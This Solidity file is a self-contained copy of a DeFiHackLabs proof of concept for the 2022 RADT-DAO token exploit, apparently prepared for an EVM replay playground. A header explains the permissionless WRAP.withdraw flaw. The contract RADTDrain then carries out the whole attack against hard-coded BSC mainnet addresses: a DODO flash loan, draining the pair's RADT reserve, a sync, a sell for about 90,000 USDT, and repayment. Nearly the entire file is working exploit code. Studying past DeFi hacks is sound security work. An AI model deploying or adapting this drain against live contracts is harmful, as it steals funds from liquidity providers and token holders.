// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2022-09-RADT).
//
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry `ContractTest`
// harness — the DODO flash-loan callback `DPPFlashLoanCall` lives on the test
// itself (`assetTo = address(this)`), so there is no standalone contract to
// deploy. This file is a faithful, self-contained copy of that inline attack
// (testExploit body + DPPFlashLoanCall callback + minimal inline interfaces —
// no imports so it compiles anywhere), compiled inside the registry forge
// project. Logic and constants are copied verbatim from test/RADT_exp.sol.
//
// Root cause: TWN (the "RADT-DAO" reflection token) externalizes its
// reflection/reward logic to a separate "WRAP" contract held in `_wrap`, and
// on every transfer calls `_wrap.withdraw(from, to, amount)`. The WRAP can move
// ANY holder's balance back through the token's `fallback()/_receiveReward()`
// path. Fatal flaw: `WRAP.withdraw(from, to, amount)` is callable by ANYONE
// with arbitrary arguments — nothing restricts the caller to the token, and
// nothing excludes the AMM pair from being a redistribution victim. The
// attacker calls `wrap.withdraw(holder, pair, balanceOf(pair)*100/9)` directly,
// which redistributes the pair's RADT reserve to other holders (an
// un-compensated deletion of one side of the pool), then `pair.sync()` bakes
// the depleted RADT reserve in as ground truth. A subsequent RADT→USDT sell
// into the now-degenerate pool pays out ~90,012 USDT. After repaying the
// 200,000 USDT DODO flash loan the attacker keeps ~89,012 USDT profit.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IWRAP {
    function withdraw(address from, address to, uint256 amount) external;
}

interface IDODO {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
}

interface IUniPair {
    function sync() external;
}

interface IUniRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract RADTDrain {
    // attacker / profit receiver (the historical PoC test-contract address).
    address constant ATTACKER = 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496;
    IERC20 constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 constant RADT = IERC20(0xDC8Cb92AA6FC7277E3EC32e3f00ad7b8437AE883);
    IUniPair constant PAIR = IUniPair(0xaF8fb60f310DCd8E488e4fa10C48907B7abf115e);
    IWRAP constant WRAP = IWRAP(0x01112eA0679110cbc0ddeA567b51ec36825aeF9b);
    address constant DODO = 0xDa26Dd3c1B917Fbf733226e9e71189ABb4919E3f;
    IUniRouter constant ROUTER = IUniRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    // holder address fed to wrap.withdraw (copied verbatim from the test).
    address constant HOLDER = 0x68Dbf1c787e3f4C85bF3a0fd1D18418eFb1fb0BE;

    // step 1: approve the router, then flash-borrow 200,000 USDT from DODO (fee-free).
    // The callback below performs the reserve drain + sell, then repays the loan.
    function run() external {
        USDT.approve(address(ROUTER), type(uint256).max);
        RADT.approve(address(ROUTER), type(uint256).max);
        IDODO(DODO).flashLoan(0, 200_000 * 1e18, address(this), new bytes(1));
    }

    // DODO DPP flash-loan callback (DPPFlashLoanCall). Mirrors the test body
    // verbatim: buy a little RADT inventory, drain the pair's RADT reserve via
    // the permissionless wrap.withdraw + sync, sell the RADT back for USDT, then
    // repay the 200,000 USDT loan.
    function DPPFlashLoanCall(address, uint256, uint256, bytes calldata) external {
        buyRADT();
        USDT.transfer(address(PAIR), 1);
        uint256 amount = RADT.balanceOf(address(PAIR)) * 100 / 9;
        WRAP.withdraw(HOLDER, address(PAIR), amount);
        PAIR.sync();
        sellRADT();
        USDT.transfer(DODO, 200_000 * 1e18);
    }

    function buyRADT() internal {
        address[] memory path = new address[](2);
        path[0] = address(USDT);
        path[1] = address(RADT);
        ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            1000 * 1e18, 0, path, address(this), block.timestamp
        );
    }

    function sellRADT() internal {
        address[] memory path = new address[](2);
        path[0] = address(RADT);
        path[1] = address(USDT);
        ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            RADT.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }
}
